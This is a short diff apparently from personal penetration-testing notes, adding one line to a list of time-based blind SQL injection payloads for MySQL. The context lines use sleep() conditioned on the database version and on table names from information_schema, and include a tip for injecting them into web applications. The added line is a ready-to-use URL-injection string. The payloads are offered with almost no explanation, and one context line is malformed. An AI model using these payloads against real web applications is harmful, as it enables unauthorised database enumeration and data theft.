@@ -913,6 +913,7 @@ select if ((select version()) like "13%", sleep(10), null);
 while injecting in webapp use peranthesis  (select if ((select version()) like "13%", sleep(10), null);)
 select if ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e', like "13%", sleep(10), null); - like might also work
 select if ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e', sleep(10), null);
+1' and if ((select version()) like "13%", sleep(10), null); --+
 
 
 
